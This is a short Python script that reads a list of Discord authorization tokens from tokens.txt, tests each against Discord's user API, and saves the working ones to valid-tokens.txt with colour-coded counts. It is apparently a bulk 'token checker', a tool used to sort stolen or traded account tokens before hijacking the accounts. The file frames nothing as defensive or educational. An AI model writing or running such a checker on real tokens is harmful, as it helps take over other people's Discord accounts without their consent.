import requests

# ANSI color codes
class Color:
    RESET = '\033[0m'
    GREEN = '\033[92m'
    RED = '\033[91m'

def check_token(token):
    headers = {
        'Authorization': token
    }
    response = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
    if response.status_code == 200:
        return True
    else:
        return False

def validate_tokens(tokens):
    validated_tokens = []
    invalid_tokens = []
    for token in tokens:
        token = token.strip()
        if token not in validated_tokens and token not in invalid_tokens:
            if check_token(token):
                validated_tokens.append(token)
            else:
                invalid_tokens.append(token)
        else:
            invalid_tokens.append(token)
    return validated_tokens, invalid_tokens

def main():
    with open('tokens.txt', 'r') as file:
        token_list = file.readlines()

    validated_tokens, invalid_tokens = validate_tokens(token_list)

    with open('valid-tokens.txt', 'w') as file:
        for token in validated_tokens:
            file.write(token + '\n')

    num_valid_tokens = len(validated_tokens)
    num_invalid_tokens = len(invalid_tokens)

    print(f'{Color.GREEN}Valid tokens: {num_valid_tokens}{Color.RESET}')
    print(f'{Color.RED}Invalid tokens: {num_invalid_tokens}{Color.RESET}')

if __name__ == '__main__':
    main()
